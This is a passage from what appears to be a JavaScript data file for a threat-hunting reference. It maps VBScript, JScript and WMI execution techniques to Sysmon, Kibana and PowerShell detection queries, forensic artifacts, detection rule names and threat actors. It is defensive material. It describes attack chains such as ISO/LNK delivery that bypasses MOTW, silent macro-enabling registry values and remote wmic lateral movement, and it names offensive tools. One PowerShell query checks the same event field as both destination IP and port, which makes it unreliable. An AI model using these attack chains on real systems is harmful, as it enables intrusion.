AND process.parent.name: ("winword.exe" OR "excel.exe" OR "powerpnt.exe" OR "outlook.exe" OR "onenote.exe" OR "msaccess.exe" OR "mspub.exe")`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match '(wscript|cscript)\.exe$' -and
  $_.Properties[20].Value -match
    'winword|excel|powerpnt|outlook|onenote|msaccess|mspub'
} | Select TimeCreated,
  @{n='ScriptHost';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `VBA macro artifacts:
- %APPDATA%\\Microsoft\\Templates\\Normal.dotm
  (Word global template - macros stored here persist
  across all Word sessions, high-value persistence location)
- %APPDATA%\\Microsoft\\Word\\STARTUP\\*.dotm
- %APPDATA%\\Microsoft\\Excel\\XLSTART\\*.xlam
- %APPDATA%\\Microsoft\\Excel\\XLSTART\\*.xlsm

Office Trust Center registry keys
(adversaries sometimes modify to enable macros silently):
HKCU\\Software\\Microsoft\\Office\\<version>\\<app>\\
  Security\\VBAWarnings = 1 (REG_DWORD)
  (1 = enable all macros without notification)
  AccessVBOM = 1
  (grants macro access to VBA object model)

Script dropped by macro - common staging locations:
- %TEMP%\\*.vbs
- %APPDATA%\\*.vbs
- %PUBLIC%\\*.vbs
- C:\\ProgramData\\*.vbs`,
        tools: `Emotet (VBA macro dropper - historically prolific)
QakBot / QBot (macro-based delivery pre-2022)
IcedID (macro delivery variants)
Dridex (Office macro delivery)
Agent Tesla (VBA macro stager)
Custom VBA macro loaders (common in targeted ops)

Note: Microsoft's 2022 internet-macro block
significantly reduced this vector for commodity
malware. It remains relevant for:
- Internally-sourced documents (no MOTW applied)
- Targeted ops where the attacker can social-engineer
  the victim into enabling macros
- Legacy environments where the block is not enforced
  (Office 2016 and earlier, or policy-disabled block)
- Macro-enabled templates delivered via SMB share
  (SMB-sourced files do not get MOTW in most configs)`,
        ossdetect: `Sigma:
- proc_creation_win_office_wscript_child.yml
- proc_creation_win_office_cscript_child.yml
- proc_creation_win_office_susp_child.yml
  (covers wscript, cscript, cmd, powershell children)

Atomic Red Team:
- T1059.005 (VBScript execution tests)
- T1566.001 (phishing with macro delivery)

Hayabusa:
- Office spawn detection rules cover wscript/cscript
- "SuspiciousOfficeChildProcess" category

Velociraptor:
- Windows.Detection.OfficeSpawn
- Windows.System.Autoruns (catches macro persistence
  via Normal.dotm and XLSTART locations)

YARA:
- Many VBA macro detection rules in community repos
- Didier Stevens' oledump.py for static macro analysis`,
        notes: "wscript.exe and cscript.exe are the two Windows Script Host engines - wscript runs scripts with a GUI context (no console window visible), cscript runs them in a console. Adversaries strongly prefer wscript for macro-dropped scripts because it runs silently. The detection is the same as the Office-spawning-PowerShell and Office-spawning-cmd patterns - the anomaly is the parent, not the child. One important addition to the parent list vs the cmd/PS indicators: onenote.exe. Since the MOTW macro block in 2022, OneNote became a popular delivery vehicle - embedded attachments inside .one files execute via the OneNote process, not a standard Office app. Also worth noting: msaccess.exe and mspub.exe are lower-volume Office apps that get less scrutiny but are used in targeted operations specifically because defenders don't always include them in parent-process watchlists. False positives: IT automation scripts occasionally use wscript legitimately - allowlist by known-good script paths and parent context.",
        apt: [
          { cls: "apt-mul", name: "Commodity Malware", note: "Emotet, QakBot, IcedID all used Office macro to wscript/cscript chains extensively pre-2022." },
          { cls: "apt-ru", name: "APT28", note: "VBA macro delivery documented in multiple spearphishing campaigns." },
          { cls: "apt-ir", name: "APT35", note: "Office macro-based initial access documented in CISA advisories targeting US organizations." },
          { cls: "apt-cn", name: "APT41", note: "VBA macro loaders documented in operations against multiple sectors." },
          { cls: "apt-mul", name: "TA505", note: "Prolific use of Office macro chains spawning wscript as part of Dridex and Clop distribution." }
        ],
        cite: "MITRE ATT&CK T1059.005, T1566.001"
      },
      {
        sub: "T1059.005 - ISO/LNK Container Dropping VBScript",
        os: "win",
        indicator: "wscript.exe executing .vbs file from mounted ISO, %TEMP%, or %APPDATA% - post-MOTW container evasion chain",
        sysmon: `EventID=1
Image=*\\wscript.exe OR *\\cscript.exe
CommandLine matches:
  *.vbs* OR *.vbe* OR *.wsf*
AND CommandLine path matches:
  *\\AppData\\* OR *\\Temp\\* OR *\\Public\\*
  OR *\\ProgramData\\* OR [A-Z]:\\*.vbs
  (single drive-letter root = likely mounted ISO)

// Supplementary - Sysmon EID 11 FileCreate:
EventID=11
TargetFilename=*.vbs OR *.vbe OR *.wsf
TargetFilename path=*\\Temp\\* OR *\\AppData\\*
  OR *\\Public\\* OR *\\ProgramData\\*`,
        kibana: `// Primary: wscript/cscript running script from suspicious path
winlog.event_id: 1
AND process.name: ("wscript.exe" OR "cscript.exe")
AND process.command_line: (*.vbs* OR *.vbe* OR *.wsf*)
AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\Public\\* OR *\\ProgramData\\*)

// Supplementary: VBScript file written to suspicious path
winlog.event_id: 11
AND file.extension: ("vbs" OR "vbe" OR "wsf")
AND file.path: (*\\Temp\\* OR *\\AppData\\* OR *\\Public\\* OR *\\ProgramData\\*)`,
        powershell: `# Hunt for wscript/cscript running scripts from non-standard paths
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match '(wscript|cscript)\.exe$' -and
  $_.Properties[10].Value -match '\.(vbs|vbe|wsf)' -and
  $_.Properties[10].Value -match
    '(AppData|Temp|Public|ProgramData|^[A-Z]:\\\\[^\\\\]+\.(vbs|vbe|wsf))'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: VBS files written to suspicious locations (EID 11)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=11
} | Where-Object {
  $_.Properties[0].Value -match '\.(vbs|vbe|wsf)$' -and
  $_.Properties[0].Value -match '(Temp|AppData|Public|ProgramData)'
} | Select TimeCreated,
  @{n='File';e={$_.Properties[0].Value}},
  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
        registry: `ISO/container mount artifacts:
- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\
  Explorer\\MountPoints2\\
  (records mounted drive letters including ISO mounts -
  entry appears when user opens/mounts an ISO file)

Zone.Identifier ADS on the ISO file itself
(present on the .iso - NOT on files extracted from it):
- Get-Item *.iso -Stream Zone.Identifier
  ZoneId=3 confirms internet origin

LNK file artifacts (the launcher inside the ISO):
- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk
  (LNK files created when user double-clicks inside ISO)
- LNK target path will point to the .vbs inside the
  mounted drive letter (e.g., D:\\payload.vbs)

Script file on disk - investigate with:
- Get-Content <path>.vbs (read the actual script)
- Check file creation time vs execution time
  (gap indicates staging before execution)`,
        tools: `ISO/IMG container delivery (2022+ dominant vector):
- Adversary crafts ISO containing LNK + VBS payload
- LNK has custom icon to look like legitimate document
- User opens ISO (auto-mounts in Win10/11), double-clicks
  what appears to be a file, LNK runs wscript against VBS

ZIP delivery variants:
- Password-protected ZIP (bypasses email gateway AV scan)
- Extracts to %TEMP%, LNK or direct VBS execution

OneNote (.one) embedded attachments:
- .vbs embedded directly in OneNote section
- User prompted to click "Click to view attachment"
- File extracted to %TEMP% and executed via wscript

Tools/families using this chain:
Qakbot (post-macro-block ISO pivot, 2022-2023)
IcedID (ISO delivery variants)
Bumblebee loader (heavy ISO + LNK + VBS use)
Raspberry Robin (worm spread via LNK on USB/ISO)
Various initial access brokers (IABs)`,
        ossdetect: `Sigma:
- proc_creation_win_wscript_vbs_exec_susp_location.yml
- file_event_win_vbs_creation_susp_location.yml
- proc_creation_win_susp_script_exec_from_temp.yml

Atomic Red Team:
- T1059.005 (VBScript from temp directory tests)
- T1566.001 (ISO/LNK delivery chain)

Hayabusa:
- ScriptFromTemp and ScriptFromAppData rules
- ISO mount + LNK detection rules

Velociraptor:
- Windows.Detection.Autoruns
- Windows.Forensics.Lnk (LNK file analysis)
- Windows.System.MountedDevices (ISO mount history)

Any.run / VirusTotal sandbox:
- Submit suspicious VBS files for behavioral analysis
- VBS is often obfuscated but sandboxes detonate it`,
        notes: "This indicator represents the post-2022 evolution of VBScript delivery after Microsoft's macro block. The ISO container trick works because Windows auto-mounts ISO files when double-clicked (since Windows 8), and files inside the mounted ISO volume do not inherit the Zone.Identifier ADS from the outer ISO file - so the .vbs inside has no MOTW and runs without a macro security prompt. The detection pivot is twofold: first, the ISO mount event itself (MountPoints2 registry key, Sysmon EID 11 on the ISO), then wscript executing a script from a mounted drive letter or staging path. The drive-letter heuristic (wscript running D:\\something.vbs where D: is not a standard drive) is high-fidelity but requires knowing which drive letters are fixed vs removable vs mounted in your environment. The %TEMP% and %APPDATA% path heuristics are broader and catch the cases where the script is first dropped to disk before execution. VBE (.vbe) is encoded VBScript - the content is obfuscated using Microsoft's Script Encoder - and is a meaningful escalation signal when seen in these paths.",
        apt: [
          { cls: "apt-mul", name: "Initial Access Brokers", note: "ISO/LNK/VBS chains are the dominant IAB delivery method post-2022 macro block." },
          { cls: "apt-mul", name: "QakBot", note: "Pivoted to ISO + VBS delivery after the 2022 Microsoft macro block." },
          { cls: "apt-mul", name: "Bumblebee", note: "Heavy use of ISO container with LNK launching VBS or DLL payload." },
          { cls: "apt-kp", name: "Lazarus", note: "ISO-based delivery documented in operations against financial and defense sectors." },
          { cls: "apt-mul", name: "Raspberry Robin", note: "LNK-based worm using wscript for execution, spread via USB and ISO." }
        ],
        cite: "MITRE ATT&CK T1059.005, T1566.001, T1027"
      }
    ]
  },
  {
    id: "T1059.007",
    name: "Command and Scripting Interpreter: JavaScript",
    desc: "JScript via Windows Script Host, mshta+JS chains, fileless JS loaders",
    rows: [
      {
        sub: "T1059.007 - WSH Executing JScript from Suspicious Path",
        os: "win",
        indicator: "wscript.exe or cscript.exe running .js or .jse file from %TEMP%, %APPDATA%, or mounted container path",
        sysmon: `EventID=1
Image=*\\wscript.exe OR *\\cscript.exe
CommandLine matches:
  *.js* OR *.jse*
AND CommandLine path matches:
  *\\AppData\\* OR *\\Temp\\* OR *\\Public\\*
  OR *\\ProgramData\\* OR [A-Z]:\\*.js

// Supplementary - Sysmon EID 11 FileCreate:
EventID=11
TargetFilename=*.js OR *.jse
TargetFilename path=
  *\\Temp\\* OR *\\AppData\\*
  OR *\\Public\\* OR *\\ProgramData\\*`,
        kibana: `// Primary: WSH executing JScript from suspicious path
winlog.event_id: 1
AND process.name: ("wscript.exe" OR "cscript.exe")
AND process.command_line: (*.js* OR *.jse*)
AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\Public\\* OR *\\ProgramData\\*)

// Supplementary: JScript file written to suspicious path
winlog.event_id: 11
AND file.extension: ("js" OR "jse")
AND file.path: (*\\Temp\\* OR *\\AppData\\* OR *\\Public\\* OR *\\ProgramData\\*)`,
        powershell: `# Hunt for wscript/cscript executing JScript from non-standard paths
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match '(wscript|cscript)\.exe$' -and
  $_.Properties[10].Value -match '\.(js|jse)(\s|"|$)' -and
  $_.Properties[10].Value -match
    '(AppData|Temp|Public|ProgramData|^[A-Z]:\\\\[^\\\\]+\.(js|jse))'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: JS/JSE files written to suspicious locations (EID 11)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=11
} | Where-Object {
  $_.Properties[0].Value -match '\.(js|jse)$' -and
  $_.Properties[0].Value -match '(Temp|AppData|Public|ProgramData)'
} | Select TimeCreated,
  @{n='File';e={$_.Properties[0].Value}},
  @{n='CreatingProcess';e={$_.Properties[5].Value}}`,
        registry: `No direct registry artifact from JScript execution itself.

JS/JSE file on disk - investigate with:
- Get-Content <path>.js (read the script - often obfuscated)
- Common obfuscation: eval(), String.fromCharCode(),
  ActiveXObject instantiation buried in encoded strings
- JSE (.jse) is Microsoft Script Encoded JScript -
  same obfuscation as VBE, content not human-readable
  without decoding

Container mount artifacts (same as T1059.005):
- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\
  Explorer\\MountPoints2\\
  (ISO mount history)

Zone.Identifier ADS on source container:
- Get-Item *.iso -Stream Zone.Identifier
  ZoneId=3 confirms internet origin

File association context:
- .js files are associated with wscript.exe by default
  on Windows (HKCR\\.js\\Shell\\Open\\Command)
- Adversaries rely on this default association -
  user double-clicking a .js file triggers wscript
  with no visible console if using the GUI handler`,
        tools: `Delivery mechanisms for .js payloads:
- ZIP/RAR containing .js file (email attachment)
- ISO container with LNK pointing to .js (post-MOTW)
- Direct .js file attachment (increasingly blocked
  by mail gateways but still attempted)
- Drive-by download dropping .js to %TEMP%

Frameworks and families using JScript via WSH:
Gootloader (heavy use of .js delivery, multi-stage)
TA505 / Dridex variants
Qakbot (JS-based loader variants)
Bumblebee (JS staging in some variants)
Custom loaders (targeted ops favoring WSH over PS
  for lower detection profile)

Gootloader note: particularly notable for using
large, heavily obfuscated .js files (thousands of
lines) staged in registry or %APPDATA% - the file
size and obfuscation density are signals in addition
to path and execution context.`,
        ossdetect: `Sigma:
- proc_creation_win_wscript_jscript_exec_susp_location.yml
- file_event_win_jscript_creation_susp_location.yml
- proc_creation_win_wscript_susp_child_process.yml

Atomic Red Team:
- T1059.007 (WSH JScript execution tests)

Hayabusa:
- JScriptFromTemp and related rules
- WSH execution detection category

Velociraptor:
- Windows.EventLogs.Sysmon (EID 1 + EID 11 filters)
- Windows.Forensics.Gootloader (dedicated artifact
  for Gootloader JS registry staging)

Static analysis:
- CyberChef: decode JSE (Script Encoder decode recipe)
- js-beautify: deobfuscate minified/packed JS
- Any.run: sandbox detonation for behavioral analysis`,
        notes: "The detection pattern here is nearly identical to T1059.005 VBScript - same engines (wscript/cscript), same suspicious paths, same EID 11 supplementary hunt. The distinctions that matter: .js files have a user-visible double-click association on Windows (wscript runs them silently), making them effective for lure-based delivery without requiring a macro or container trick. The user sees what looks like a document icon, double-clicks, and wscript silently executes the payload. JSE (.jse) is encoded JScript using Microsoft's Script Encoder - same tool as VBE encoding - and is a stronger signal because legitimate software rarely produces .jse files in staging directories. Gootloader is worth calling out specifically because it uses an unusual pattern: a large multi-stage .js file (often 5,000+ lines of obfuscated code) that may be staged in the registry between stages rather than purely on disk - if you see wscript running a .js with an unusually large file size or see powershell.exe reading registry values and piping to wscript, that's a Gootloader indicator. False positives: some legitimate software installers use .js files during setup, typically from their own installation directory rather than temp paths - path context resolves most of these.",
        apt: [
          { cls: "apt-mul", name: "Gootloader", note: "Signature use of large obfuscated .js files for multi-stage delivery, heavily documented." },
          { cls: "apt-mul", name: "TA505", note: "JScript-based loaders used in Dridex and FlawedAmmyy distribution campaigns." },
          { cls: "apt-mul", name: "Initial Access Brokers", note: "ZIP-delivered .js files are a recurring IAB delivery mechanism." },
          { cls: "apt-cn", name: "APT41", note: "JScript-based loaders documented in operations against multiple sectors." },
          { cls: "apt-mul", name: "Commodity Malware", note: "JScript delivery present across multiple malware families favoring WSH over PowerShell for lower detection profile." }
        ],
        cite: "MITRE ATT&CK T1059.007"
      },
      {
        sub: "T1059.007 - Office or Browser Spawning WSH with JScript Payload",
        os: "win",
        indicator: "wscript.exe with .js argument spawned by Office app, browser, or explorer.exe - delivery chain execution",
        sysmon: `EventID=1
Image=*\\wscript.exe OR *\\cscript.exe
CommandLine matches: *.js* OR *.jse*
ParentImage=
  *\\winword.exe
  OR *\\excel.exe
  OR *\\powerpnt.exe
  OR *\\outlook.exe
  OR *\\onenote.exe
  OR *\\explorer.exe
  OR *\\chrome.exe
  OR *\\msedge.exe
  OR *\\firefox.exe
  OR *\\iexplore.exe`,
        kibana: `winlog.event_id: 1
AND process.name: ("wscript.exe" OR "cscript.exe")
AND process.command_line: (*.js* OR *.jse*)
AND process.parent.name: ("winword.exe" OR "excel.exe" OR "powerpnt.exe" OR "outlook.exe" OR "onenote.exe" OR "explorer.exe" OR "chrome.exe" OR "msedge.exe" OR "firefox.exe" OR "iexplore.exe")`,
        powershell: `Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -match '(wscript|cscript)\.exe$' -and
  $_.Properties[10].Value -match '\.(js|jse)(\s|"|$)' -and
  $_.Properties[20].Value -match
    'winword|excel|powerpnt|outlook|onenote|explorer|chrome|msedge|firefox|iexplore'
} | Select TimeCreated,
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending`,
        registry: `Browser download artifacts - confirm the JS file origin:
- Chrome download history:
  %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\
  History (SQLite - query Downloads table)
- Edge download history:
  %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\
  History (SQLite - same schema as Chrome)
- Firefox download history:
  %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\
  downloads.sqlite

Zone.Identifier ADS on the .js file itself
(if delivered via browser download, this will be present):
- Get-Item payload.js -Stream Zone.Identifier
  ZoneId=3 = internet origin
  ReferrerUrl and HostUrl fields present in Win10+
  (confirm which site delivered the file)

explorer.exe parent context:
- explorer spawning wscript means the user double-clicked
  the .js file directly in Explorer or from an email
  attachment saved to disk - check Recent files:
  %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk`,
        tools: `Explorer.exe parent (user double-click):
- Most common for commodity JS delivery
- User receives ZIP, extracts .js, double-clicks thinking
  it's a document - wscript runs silently

Browser parent:
- Drive-by download delivering .js file
- Browser auto-opens downloaded .js (rare - most browsers
  now prompt before opening script files, but older
  configs and IE/legacy Edge allow auto-open)
- More common: browser downloads, user manually opens

Office parent:
- VBA macro drops a .js file then executes it via Shell()
- Less common than direct wscript.exe delivery but creates
  a cleaner two-stage chain (macro handles download,
  JS handles execution/persistence)

Families using these chains:
Gootloader (SEO poisoning -> browser download -> user opens .js)
Qakbot variants
TA505 campaigns
Various phishing operators`,
        ossdetect: `Sigma:
- proc_creation_win_wscript_jscript_susp_parent.yml
- proc_creation_win_explorer_wscript_child.yml
- proc_creation_win_browser_susp_child_process.yml
  (covers browser spawning any script host)

Atomic Red Team:
- T1059.007 (parent process variants)

Hayabusa:
- BrowserSpawnScriptHost rules
- OfficeSpawnWSH category

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.Forensics.BrowserHistory
  (correlate download time with wscript execution time)

Gootloader-specific:
- ANY.RUN Gootloader behavioral signatures
- Velociraptor Windows.Forensics.Gootloader artifact`,
        notes: "The explorer.exe parent is the most common real-world path for JScript delivery - it means the user double-clicked the .js file directly, relying on the default Windows file association (wscript.exe handles .js). This is the 'ZIP attachment -> extract -> double-click' chain. Gootloader is the canonical example and worth understanding in depth: it uses SEO poisoning to rank malicious sites in search results for legal/business document searches, delivers a large obfuscated .js file disguised as the document, and relies entirely on the user double-clicking it. The browser parent variant is less common now because modern browsers (Chrome, Edge) warn before opening script files downloaded from the internet - but it still surfaces in environments with older browser configurations or where the .js is delivered inside a password-protected ZIP (bypasses browser warning because the file is 'opened' from the ZIP handler, not the browser directly). The Office parent variant is the most sophisticated - it means a macro is orchestrating the JScript execution as a second stage, suggesting a more deliberate operator rather than commodity tooling.",
        apt: [
          { cls: "apt-mul", name: "Gootloader", note: "Canonical example of explorer-spawned wscript via user double-click of SEO-poisoned .js lure." },
          { cls: "apt-mul", name: "TA505", note: "Browser and email delivery chains resulting in wscript execution documented across campaigns." },
          { cls: "apt-mul", name: "Phishing Operators", note: "ZIP-delivered .js with explorer parent is a standard commodity phishing pattern." },
          { cls: "apt-cn", name: "APT41", note: "Multi-stage chains using Office macro dropping and executing JScript documented in intrusion reports." }
        ],
        cite: "MITRE ATT&CK T1059.007, T1566.001"
      }
    ]
  },
  {
    id: "T1047",
    name: "Windows Management Instrumentation",
    desc: "wmic.exe process create, remote WMI execution, WMI subscription persistence",
    rows: [
      {
        sub: "T1047 - Local Process Creation via wmic",
        os: "win",
        indicator: "wmic.exe with 'process call create' argument - spawning a process via WMI to avoid direct cmd/PS execution",
        sysmon: `EventID=1
Image=*\\wmic.exe
CommandLine=*process*call*create*

// Also watch for child processes of wmiprvse.exe
// that are not typical WMI management children:
EventID=1
ParentImage=*\\wmiprvse.exe
Image NOT IN:
  *\\WmiPrvSE.exe
  *\\msiexec.exe
  *\\scrcons.exe
  (other known-good WMI children in your environment)`,
        kibana: `// Primary: wmic process call create
winlog.event_id: 1
AND process.name: "wmic.exe"
AND process.command_line: (*process* AND *call* AND *create*)

// Supplementary: suspicious wmiprvse.exe children
winlog.event_id: 1
AND process.parent.name: "wmiprvse.exe"
AND NOT process.name: ("WmiPrvSE.exe" OR "msiexec.exe" OR "scrcons.exe")`,
        powershell: `# Hunt for wmic process call create executions
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\wmic.exe' -and
  $_.Properties[10].Value -match 'process\s+call\s+create'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: unexpected wmiprvse.exe children
$knownGoodWmiChildren = @('WmiPrvSE.exe','msiexec.exe','scrcons.exe')
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[20].Value -like '*\\wmiprvse.exe' -and
  $knownGoodWmiChildren -notcontains
    ($_.Properties[4].Value -split '\\\\')[-1]
} | Select TimeCreated,
  @{n='Child';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `No direct registry artifact from wmic process execution.

WMI repository location (the underlying database):
- C:\\Windows\\System32\\wbem\\Repository\\
  (OBJECTS.DATA, INDEX.BTR, INDEX.MAP)
  Not human-readable directly - use specialized tools
  (PyWMIPersistenceFinder, WMI-Forensics) for analysis

Investigation pivots:
- Child process of wmic or wmiprvse.exe:
  Sysmon EID 1, filter ParentImage to find what
  wmic actually launched
- Network connections from spawned child:
  Sysmon EID 3 within same session
- wmic.exe is deprecated as of Windows 11 24H2 -
  its presence in Sysmon logs on modern endpoints
  is itself a mild anomaly worth noting

wmic.exe location:
- C:\\Windows\\System32\\wbem\\wmic.exe (legitimate)
- wmic.exe found anywhere else = high-confidence IOC`,
        tools: `Cobalt Strike (WMI lateral movement module)
Metasploit (exploit/windows/local/wmi)
Impacket wmiexec.py (remote WMI execution without wmic)
CrackMapExec (--exec-method wmiexec)
Custom scripts using WMI COM objects directly
  (bypasses wmic.exe entirely - harder to detect)
PowerShell Invoke-WmiMethod / Invoke-CimMethod
  (same underlying WMI, no wmic.exe on disk)

Note on detection evasion: sophisticated operators
avoid wmic.exe entirely and call WMI COM objects
directly from PowerShell or via compiled code.
In those cases, the execution artifact shifts to
wmiprvse.exe spawning unexpected children rather
than wmic.exe appearing in process logs.`,
        ossdetect: `Sigma:
- proc_creation_win_wmic_process_creation.yml
- proc_creation_win_wmiprvse_susp_child_process.yml
- proc_creation_win_wmic_susp_execution.yml

Atomic Red Team:
- T1047 Test #1 (wmic process call create)
- T1047 Test #2 (WMI via PowerShell)

Hayabusa:
- WMI process creation detection rules
- wmiprvse child process anomaly rules

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.System.Wmi (WMI namespace enumeration)
- Windows.Forensics.WMIPersistence`,
        notes: "wmic process call create is the most direct WMI execution path - it tells WMI to instantiate the Win32_Process class and call its Create method, spawning a new process. The resulting child process has wmiprvse.exe as its parent rather than cmd.exe or powershell.exe, which is the key detection pivot. This parent-swap is intentional: adversaries use it to break the process ancestry chain and make the spawned process appear to originate from a system management context rather than a user shell. The wmiprvse.exe suspicious child detection is arguably more durable than the wmic.exe detection because it catches cases where the attacker calls WMI COM objects directly (bypassing wmic.exe entirely) as well as the standard wmic path. False positives: wmiprvse.exe legitimately spawns msiexec.exe, scrcons.exe, and a handful of other management processes - build your allowlist from a baseline of normal WMI activity in your environment before alerting on everything. Also note: wmic.exe deprecated in Windows 11 24H2 but still present and functional on virtually all enterprise endpoints you will encounter in practice.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "WMI process execution documented across multiple operations including SolarWinds follow-on activity." },
          { cls: "apt-cn", name: "APT41", note: "wmic.exe and direct WMI COM execution documented in intrusions across multiple sectors." },
          { cls: "apt-cn", name: "APT32", note: "WMI-based execution used for lateral movement and staging in documented operations." },
          { cls: "apt-mul", name: "Ransomware", note: "WMI process creation used for lateral movement and payload execution across many ransomware operations." },
          { cls: "apt-mul", name: "Cobalt Strike", note: "Built-in WMI lateral movement module used extensively by ransomware affiliates and APT operators." }
        ],
        cite: "MITRE ATT&CK T1047"
      },
      {
        sub: "T1047 - Remote WMI Execution",
        os: "win",
        indicator: "wmic.exe with /node: flag targeting remote host - lateral movement via WMI over DCOM/RPC",
        sysmon: `// On SOURCE host - wmic with remote /node: target:
EventID=1
Image=*\\wmic.exe
CommandLine=*/node:*

// On DESTINATION host - wmiprvse.exe spawning
// unexpected child process (incoming WMI execution):
EventID=1
ParentImage=*\\wmiprvse.exe
// Cross-reference: does this system normally receive
// remote WMI connections? If not, any wmiprvse child
// is suspicious.

// Network connection from source:
EventID=3
Image=*\\wmic.exe
DestinationPort=135
// (DCOM initial negotiation - then ephemeral port)`,
        kibana: `// Source host: wmic targeting remote system
winlog.event_id: 1
AND process.name: "wmic.exe"
AND process.command_line: *\/node\:*

// Destination host: wmiprvse spawning processes
// (correlate with source network events)
winlog.event_id: 1
AND process.parent.name: "wmiprvse.exe"
AND NOT process.name: ("WmiPrvSE.exe" OR "msiexec.exe")

// Network: wmic initiating DCOM connection
winlog.event_id: 3
AND process.name: "wmic.exe"
AND destination.port: 135`,
        powershell: `# Hunt for remote WMI execution attempts (source side)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\wmic.exe' -and
  $_.Properties[10].Value -match '/node:'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}} |
  Sort-Object TimeCreated -Descending

# Hunt for DCOM network connections from wmic (EID 3)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=3
} | Where-Object {
  $_.Properties[4].Value -like '*\\wmic.exe' -and
  $_.Properties[14].Value -eq '135'
} | Select TimeCreated,
  @{n='DestIP';e={$_.Properties[14].Value}},
  @{n='DestPort';e={$_.Properties[16].Value}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `No registry artifact on source host from wmic /node: execution.

On DESTINATION host - Windows event log artifacts:
- Security Event ID 4624 (Logon):
  LogonType 3 (Network logon) from source IP
  around the same time as wmiprvse child spawn
  - this confirms the authentication leg of
  the WMI connection
- Security Event ID 4688 (Process Creation,
  if process auditing enabled):
  Child process of wmiprvse.exe on destination

Network forensics pivot:
- DCOM uses TCP 135 for initial negotiation
  then negotiates a dynamic high port (1024-65535)
  for the actual data transfer
- Zeek/Suricata DCOM logs on your network sensor
  can correlate the source-destination pair
- This is where host-side and network-side
  detection complement each other directly`,
        tools: `wmic.exe /node: (built-in, most common)
Impacket wmiexec.py
  - Implements WMI execution without wmic.exe
  - Operates over DCOM directly
  - Leaves wmiprvse.exe child artifact on target
  - Does not use wmic.exe on source host
CrackMapExec (wmiexec method)
Cobalt Strike WMI lateral movement
PowerShell Invoke-WmiMethod -ComputerName
PowerShell New-CimSession + Invoke-CimMethod
  (modern replacement for wmic, same detection surface)

Key distinction: Impacket wmiexec.py and CrackMapExec
wmiexec do NOT use wmic.exe on the source host -
the /node: indicator only catches wmic.exe usage.
For those tools, detection shifts entirely to the
destination host's wmiprvse.exe child process and
the Security Event 4624 network logon.`,
        ossdetect: `Sigma:
- proc_creation_win_wmic_remote_execution.yml
- proc_creation_win_wmiprvse_susp_child_process.yml
- network_connection_win_wmic_remote.yml

Atomic Red Team:
- T1047 Test #3 (remote WMI execution)
- T1021.006 (Windows Remote Management - related)

Hayabusa:
- RemoteWMIExecution rules
- DCOM lateral movement detection category

Velociraptor:
- Windows.EventLogs.Sysmon (both source and dest)
- Windows.Network.NetstatEnriched (active DCOM connections)

Network-side (complements host detection):
- Zeek dce_rpc.log: filter for WMI-related operations
- Suricata: DCOM/RPC anomaly rules
- hunt.6b74.dev Lateral Movement reference
  for the network-side complement to this detection`,
